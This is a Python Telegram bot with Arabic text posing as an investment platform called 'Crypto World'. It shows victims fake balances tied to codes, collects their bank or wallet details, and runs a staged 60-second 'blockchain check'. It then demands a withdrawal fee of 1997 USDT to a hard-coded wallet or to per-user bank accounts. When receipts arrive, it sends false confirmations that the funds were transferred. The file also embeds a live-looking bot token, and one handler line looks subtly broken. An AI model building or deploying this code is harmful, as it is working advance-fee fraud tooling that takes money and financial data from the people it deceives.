import logging
import os
import json
import asyncio
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardRemove, Update
from telegram.ext import (
    ApplicationBuilder,
    ContextTypes,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    filters,
)

# التوكن المعتمد للبوت
TOKEN = "9014957370:AAHy4p48M5g6tcoU9240X3QoEiQWp0Zlw3c"
ADMIN_ID = 7004113433  # معرف الأدمن الخاص بك
SUPPORT_HANDLE = "@AbuAbdulAlziz"

logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
logger = logging.getLogger(__name__)

# ملف حفظ البيانات لضمان عدم ضياعها عند إعادة تشغيل البوت
DATA_FILE = "bot_database.json"

def load_data():
    if os.path.exists(DATA_FILE):
        try:
            with open(DATA_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception as e:
            logger.error(f"خطأ في قراءة ملف البيانات: {e}")
    return {
        "states": {},
        "custom_data": {},
        "profits": {
            "354101": {"amount": "45,500", "assigned_user_id": None},
            "00554": {"amount": "45,500", "assigned_user_id": None},
            "3585556": {"amount": "45,500", "assigned_user_id": None},
            "189415": {"amount": "1500", "assigned_user_id": None}
        },
        "fee_info": {
            "amount": "1997",
            "currency": "USDT",
            "network": "BNB Smart Chain (BEP20)",
            "address": "0x4aaf2231199d24842e606f99b4f69bb5cddb171e"
        },
        "user_fees": {},  # الرسوم الخاصة لكل مستخدم عبر الـ ID
        "all_users": []
    }

def save_data_to_file():
    try:
        data = {
            "states": user_states,
            "custom_data": user_custom_data,
            "profits": custom_profits,
            "fee_info": withdraw_fee_info,
            "user_fees": user_specific_fees,
            "all_users": list(all_users_set)
        }
        with open(DATA_FILE, "w", encoding="utf-8") as f:
            json.dump(data, f, ensure_ascii=False, indent=4)
    except Exception as e:
        logger.error(f"خطأ في حفظ البيانات: {e}")

# تحميل البيانات عند تشغيل البوت
db = load_data()
user_states = db.get("states", {})
user_custom_data = db.get("custom_data", {})
custom_profits = db.get("profits", {})
withdraw_fee_info = db.get("fee_info", {
    "amount": "1997",
    "currency": "USDT",
    "network": "BNB Smart Chain (BEP20)",
    "address": "0x4aaf2231199d24842e606f99b4f69bb5cddb171e"
})
user_specific_fees = db.get("user_fees", {})
all_users_set = set(db.get("all_users", []))

# تقدير عمر الحساب بناءً على الـ ID
def estimate_account_age(user_id: int) -> str:
    if user_id < 10000000:
        return "حساب قديم جداً (من أوائل الحسابات في المنصة)"
    elif user_id < 100000000:
        return "حساب قديم (بين 2014 - 2016 تقريباً)"
    elif user_id < 500000000:
        return "حساب متوسط القدَم (بين 2016 - 2019 تقريباً)"
    elif user_id < 1000000000:
        return "حساب نشط منذ عدة سنوات (بين 2019 - 2022 تقريباً)"
    else:
        return "حساب حديث نسبياً (وتم إنشاؤه في السنوات الأخيرة)"

# أمر الأدمن للرسوم العامة: /setwithdrawfee
async def set_withdraw_fee_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return

    args = context.args
    if len(args) < 4:
        await update.message.reply_text(
            "⚠️ **طريقة الاستخدام غير صحيحة!**\n"
            "اكتب الأمر بهذا الشكل:\n"
            "`/setwithdrawfee <المبلغ> <العملة> <الشبكة_أو_البنك> <العنوان_أو_الحساب>`",
            parse_mode="Markdown"
        )
        return

    withdraw_fee_info["amount"] = args[0]
    withdraw_fee_info["currency"] = args[1].upper()
    withdraw_fee_info["network"] = args[2]
    withdraw_fee_info["address"] = " ".join(args[3:])
    save_data_to_file()

    await update.message.reply_text("✅ **تم تحديث الرسوم العامة بنجاح!**", parse_mode="Markdown")

# أمر الأدمن لتخصيص رسوم مستخدم بالـ ID: /setuserfee
async def set_user_fee_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return

    args = context.args
    if len(args) < 5:
        await update.message.reply_text(
            "⚠️ **طريقة الاستخدام غير صحيحة!**\n"
            "اكتب الأمر بهذا الشكل:\n"
            "`/setuserfee <معرف_المستخدم> <المبلغ> <العملة> <الشبكة_أو_البنك> <العنوان_أو_الحساب>`\n\n"
            "مثال:\n`/setuserfee 8968241467 2000 SAR الراجحي 260000010006080404601`",
            parse_mode="Markdown"
        )
        return

    target_user_id = str(args[0].strip())
    amount = args[1].strip()
    currency = args[2].upper()
    network = args[3]
    address = " ".join(args[4:])

    user_specific_fees[target_user_id] = {
        "amount": amount,
        "currency": currency,
        "network": network,
        "address": address
    }
    save_data_to_file()

    await update.message.reply_text(
        f"✅ **تم تخصيص رسوم السحب للمستخدم `{target_user_id}` بنجاح!**\n\n"
        f"• المبلغ: `{amount} {currency}`\n"
        f"• البنك / الشبكة: `{network}`\n"
        f"• الحساب / العنوان:\n`{address}`",
        parse_mode="Markdown"
    )

# أمر الإذاعة للجميع: /broadcast
async def broadcast_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return

    text_to_send = " ".join(context.args)
    if not text_to_send:
        await update.message.reply_text("⚠️ اكتب الرسالة بعد الأمر `/broadcast`", parse_mode="Markdown")
        return

    for uid in list(all_users_set):
        try:
            await context.bot.send_message(chat_id=int(uid), text=text_to_send, parse_mode="Markdown")
            await asyncio.sleep(0.05)
        except Exception as e:
            logger.error(f"فشل الإرسال للمستخدم {uid}: {e}")

    await update.message.reply_text("✅ تم إرسال الإذاعة بنجاح.", parse_mode="Markdown")

# أمر تحديد رصيد وأكواد المستخدم: /setprofit
async def set_profit(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return

    args = context.args
    if len(args) < 3:
        await update.message.reply_text("⚠️ الاستخدام: `/setprofit <معرف_المستخدم> <المبلغ> <رقم_التحقق>`", parse_mode="Markdown")
        return

    target_user_id = str(args[0].strip())
    amount = args[1].strip()
    code = args[2].strip()

    custom_profits[code] = {
        "amount": amount,
        "assigned_user_id": int(target_user_id)
    }
    save_data_to_file()

    await update.message.reply_text(f"✅ تم تخصيص رصيد `{amount} SAR` وكود التحقق `{code}` للمستخدم `{target_user_id}` بنجاح.", parse_mode="Markdown")

async def admin_get_codes(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    codes_str = ", ".join([f"{code} (مبلغ: {data['amount']})" for code, data in custom_profits.items()])
    await update.message.reply_text(f"🔑 **الأكواد الفعّالة:**\n`{codes_str}`", parse_mode="Markdown")

# أمر البدء الترحيبي النظيف
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = str(user.id)
    user_states[user_id] = "waiting_for_subscription_text"
    all_users_set.add(user_id)
    save_data_to_file()
    
    age_estimation = estimate_account_age(user.id)
    
    welcome_msg = (
        f"🌟 أهلاً بك في منصة **عالم الكريبتو | Crypto World** 🌐\n"
        f"نسعد بانضمامك إلينا لنخطو معاً نحو مستقبل استثماري متميز ومربح.\n\n"
        f"📊 معلومات حسابك:\n"
        f"• معرفك الشخصي (ID): `{user.id}`\n"
        f"• تقدير الحساب: {age_estimation}\n\n"
        f"الرجاء إرسال تفاصيل بياناتك صحيحة ليتم التعرف عليك في النظام وتفعيل حسابك."
    )
    
    await update.message.reply_text(welcome_msg, parse_mode="Markdown", reply_markup=ReplyKeyboardRemove())

# معالجة الصور (الإيصالات)
async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = str(user.id)
    all_users_set.add(user_id)
    save_data_to_file()
    username = f"@{user.username}" if user.username else "بدون معرف"
    
    if not update.message.photo:
        return

    photo = update.message.photo[-1]
    await update.message.reply_text("📸 **تم استلام صورة الوصل بنجاح!**\nجاري مراجعة وتأكيد العملية من قبل الإدارة.", parse_mode="Markdown")

    keyboard = [
        [
            InlineKeyboardButton("✅ تم الدفع بنجاح", callback_data=f"admin_approve_{user_id}"),
            InlineKeyboardButton("❌ تم رفض العملية", callback_data=f"admin_reject_{user_id}")
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    admin_caption = (
        "📥 **إيصال دفع رسوم سحب جديد في (عالم الكريبتو)!**\n\n"
        f"👤 اسم المستثمر: {user.first_name}\n"
        f"🆔 معرف المستخدم: `{user.id}`\n"
        f"🔗 يوزر الحساب: {username}"
    )
    try:
        await context.bot.send_photo(chat_id=ADMIN_ID, photo=photo.file_id, caption=admin_caption, reply_markup=reply_markup, parse_mode="Markdown")
    except Exception as e:
        logger.error(f"فشل إرسال الإيصال للأدمن: {e}")

# معالجة الرسائل النصية
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = update.message
    if not msg or not msg.text:
        return

    user = update.effective_user
    user_id = str(user.id)
    all_users_set.add(user_id)
    text = msg.text.strip()
    current_state = user_states.get(user_id)

    if current_state == "completed":
        await msg.reply_text("لقد أكملت الإجراءات بالفعل ولا داعي للتكرار.")
        return

    if current_state == "waiting_for_subscription_text":
        if text.startswith("خطوات التسجيل والإشتراك") or text.startswith("خطوات التسجيل والاشتراك"):
            user_custom_data[user_id] = text
            user_states[user_id] = "waiting_for_code"
            save_data_to_file()
            await msg.reply_text("✅ تم استقبال بيانات التسجيل بنجاح.\n\nالرجاء إرسال **رقم تحقق الاشتراك** الخاص بك لتتمكن من رؤية رصيدك المتاح:")
        else:
            await msg.reply_text("❌ عذراً، الصيغة المرسلة غير صحيحة. الرجاء إرسال تفاصيل بياناتك كاملة وصحيحة.")
        return

    if current_state == "waiting_for_bank_account":
        user_states[user_id] = "completed"
        save_data_to_file()
        
        keyboard = [
            [
                InlineKeyboardButton("تأكيد السحب", callback_data="withdraw_confirm"),
                InlineKeyboardButton("إلغاء سحب", callback_data="withdraw_cancel")
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await msg.reply_text("💳 **إدخال الحساب البنكي / محفظة الاستلام:**\n\nأرسل تفاصيل حسابك أو محفظتك في رسالة هنا:", reply_markup=reply_markup, parse_mode="Markdown")
        
        await context.bot.send_message(
            chat_id=ADMIN_ID,
            text=f"🏦 **تم إدخال الحساب من المستخدم `{user.id}`:**\n{text}",
            parse_mode="Markdown"
        )
        return

    if current_state == "waiting_for_code" or text in custom_profits:
        if text in custom_profits:
            code_info = custom_profits[text]
            assigned_id = code_info["assigned_user_id"]
            
            if assigned_id is not None and assigned_id != int(user_id):
                await msg.reply_text("❌ عذراً، رقم التحقق هذا غير مخصص لحسابك.")
                return

            profit_amount = code_info["amount"]
            user_states[user_id] = "viewing_balance"
            save_data_to_file()

            keyboard = [[InlineKeyboardButton("💳 ادخل حسابك البنكي", callback_data="enter_bank_account")]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            user_specific_data = user_custom_data.get(user_id, text)

            await msg.reply_text(
                text=f"✅ **تم التحقق بنجاح!**\n\n💰 **رصيدك المتاح:** `{profit_amount} SAR`\n\nإليك بياناتك المسجلة:\n\n{user_specific_data}",
                reply_markup=reply_markup,
                parse_mode="Markdown"
            )
        else:
            await msg.reply_text("❌ رقم التحقق غير صحيح.")
        return

# معالجة الأزرار التفاعلية
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    data = query.data  
    user = query.from_user
    user_id = str(user.id)
    all_users_set.add(user_id)
    save_data_to_file()

    if data.startswith("admin_approve_") or data.startswith("admin_reject_"):
        if user.id != ADMIN_ID:
            await query.answer("هذا الإجراء للأدمن فقط!", show_alert=True)
            return

        parts = data.split("_")
        action = parts[1]
        target_user_id = int(parts[2])

        if action == "approve":
            try:
                await context.bot.send_message(chat_id=target_user_id, text="✅ **تهانينا! تم تأكيد السحب وتحويل المبلغ إلى حسابك بنجاح.**", parse_mode="Markdown")
            except:
                pass
            await query.edit_message_caption(caption=query.message.caption + "\n\n✅ **[تمت الموافقة وتأكيد السحب]**", parse_mode="Markdown")

        elif action == "reject":
            try:
                await context.bot.send_message(chat_id=target_user_id, text="❌ **عذراً، تم رفض العملية.** يرجى مراجعة الدعم.", parse_mode="Markdown")
            except:
                pass
            await query.edit_message_caption(caption=query.message.caption + "\n\n❌ **[تم رفض العملية]**", parse_mode="Markdown")
        return

    if data == "enter_bank_account":
        user_states[user_id] = "waiting_for_bank_account"
        save_data_to_file()
        await query.edit_message_text("💳 **إدخال الحساب البنكي / محفظة الاستلام:**\n\nأرسل تفاصيل حسابك أو محفظتك في رسالة هنا:", parse_mode="Markdown")

    elif data == "withdraw_cancel":
        user_states[user_id] = "completed"
        save_data_to_file()
        await query.edit_message_text("تم الإلغاء بنجاح")

    elif data == "withdraw_confirm":
        user_states[user_id] = "completed"
        save_data_to_file()
        await query.edit_message_text("⏳ **جاري التحقق من عملية السحب وتأكيد البيانات مع البلوكشين...**\n\nالرجاء الانتظار (60 ثانية)...", parse_mode="Markdown")
        
        await asyncio.sleep(60)

        keyboard = [[InlineKeyboardButton("💳 دفع", callback_data="pay_fees")]]
        reply_markup = InlineKeyboardMarkup(keyboard)

        await query.edit_message_text(
            "عذرًا لقد تم للتو تحديث نظام البيانات. يرجى العلم بأن هناك رسوم سحب مستحقة على حسابكم، ولإتمام عملية دفع الرسوم يرجى الضغط على زر \"دفع\" أدناه، ثم رفع صورة الوصل ليتم تأكيد السحب بنجاح",
            reply_markup=reply_markup,
            parse_mode="Markdown"
        )

    elif data == "pay_fees":
        fee_data = user_specific_fees.get(user_id, withdraw_fee_info)
        
        pay_details = (
            "💳 **دفع رسوم السحب:**\n\n"
            f"العملة: **{fee_data['currency']}**\n"
            f"المبلغ: **{fee_data['amount']} {fee_data['currency']}**\n"
            f"الشبكة / البنك: **{fee_data['network']}**\n\n"
            "الحساب / العنوان:\n"
            f"`{fee_data['address']}`\n\n"
            "يرجى تحويل مبلغ الرسوم المطلوبة، ثم إرسال صورة الوصل (Screenshot) هنا في المحادثة ليتم تأكيد سحبك بنجاح."
        )
        await query.edit_message_text(pay_details, parse_mode="Markdown")

def main():
    if not TOKEN:
        raise ValueError("❌ خطأ: لم يتم تعيين التوكن!")
        
    app = ApplicationBuilder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("codes", admin_get_codes))
    app.add_handler(CommandHandler("setprofit", set_profit))
    app.add_handler(CommandHandler(apiUrl="broadcast", callback=broadcast_message) if "apiUrl" in globals() else CommandHandler("broadcast", broadcast_message))
    app.add_handler(CommandHandler("setwithdrawfee", set_withdraw_fee_command))
    app.add_handler(CommandHandler("setuserfee", set_user_fee_command))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
    app.add_handler(CallbackQueryHandler(button_handler))

    print("🤖 بوت (عالم الكريبتو | Crypto World) يعمل بكفاءة تامة...")
    app.run_polling()

if __name__ == "__main__":
    main()
